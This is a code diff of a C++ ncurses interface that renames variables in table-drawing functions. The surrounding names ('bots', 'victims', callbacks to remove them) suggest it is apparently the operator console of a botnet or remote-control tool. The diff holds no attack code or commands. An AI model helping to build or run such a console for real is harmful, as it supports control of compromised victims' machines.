@@ -103,7 +103,7 @@ void user_interface::mainWindowMenu() {
 				main_window_m_.lock();
 				break;
 			case 'r':
-				if (active_tab_ == "[GET_BOT_INFO]") {	//? Definitely need to make better solution in the future
+				if (active_tab_ == "[GET_BOTS_DATA]") {	//? Definitely need to make better solution in the future
 					remove_bot_callback_(main_menu_options_idicators_[current]);
 				} else {
 					remove_victim_callback_(main_menu_options_idicators_[current]);
@@ -149,37 +149,37 @@ std::string user_interface::getInput() {
 
 void user_interface::updateMainWindowMenu(std::vector<std::string>& params) {
 	std::string current_item;
-	int parameters_num = stoi(params[0]);
-	std::vector<int> max_params_lenghts(parameters_num, 0);
+	int columns_num = stoi(params[0]);
+	std::vector<int> max_params_lenghts(columns_num, 0);
 	std::vector<std::string> data_output;
 	std::vector<std::string> ip_addresses;
 
 	for (int i = 1; i < params.size(); ++i) {
-		for (int j = 0; j < parameters_num; ++j) {
+		for (int j = 0; j < columns_num; ++j) {
 			current_item = params[i + j];
 
 			if (max_params_lenghts[j] < current_item.size()) {
 				max_params_lenghts[j] = current_item.size();
 			}
-			if (j == 0 && i > parameters_num) {
+			if (j == 0 && i > columns_num) {
 				ip_addresses.push_back(current_item);
 			}
 		}
-		i += parameters_num - 1;
+		i += columns_num - 1;
 	}
 
 	int optimal_separator_size =
-	    getOptimalSeparatorSize_(parameters_num, std::accumulate(max_params_lenghts.begin(), max_params_lenghts.end(), 0));
+	    getOptimalSeparatorSize_(columns_num, std::accumulate(max_params_lenghts.begin(), max_params_lenghts.end(), 0));
 	std::string separator = std::string(optimal_separator_size, ' ');
 
-	for (int i = 1 + parameters_num; i < params.size(); ++i) {
+	for (int i = 1 + columns_num; i < params.size(); ++i) {
 		std::vector<std::string> line;
 
-		for (int j = 0; j < parameters_num; ++j) {
+		for (int j = 0; j < columns_num; ++j) {
 			line.push_back(params[i + j] + std::string(max_params_lenghts[j] - params[i + j].size(), ' '));
 		}
 		data_output.push_back(boost::algorithm::join(line, separator));
-		i += parameters_num - 1;
+		i += columns_num - 1;
 	}
 
 	main_window_menu_options_ = std::move(data_output);
@@ -195,10 +195,10 @@ void user_interface::updateMainWindowMenu(std::vector<std::string>& params) {
 
 void user_interface::updateMainWindowTitles(std::vector<std::string>& params, std::vector<int>& max_lengths,
 					    std::string& separator) {
-	int parameters_num = stoi(params[0]);
+	int columns_num = stoi(params[0]);
 	int x_offset = 1;
 
-	for (int i = 1; i < 1 + parameters_num; ++i) {
+	for (int i = 1; i < 1 + columns_num; ++i) {
 		mvwprintw(main_window_, 0, x_offset, params[i].c_str());
 		x_offset += max_lengths[i - 1] + separator.size();
 	}
@@ -206,6 +206,6 @@ void user_interface::updateMainWindowTitles(std::vector<std::string>& params, st
 	wmove(main_window_, screen_heigth_, screen_width_);
 }
 
-int user_interface::getOptimalSeparatorSize_(int parameters_num, int line_size) {
-	return (int)(screen_width_ - line_size) / parameters_num;
+int user_interface::getOptimalSeparatorSize_(int columns_num, int line_size) {
+	return (int)(screen_width_ - line_size) / columns_num;
 }
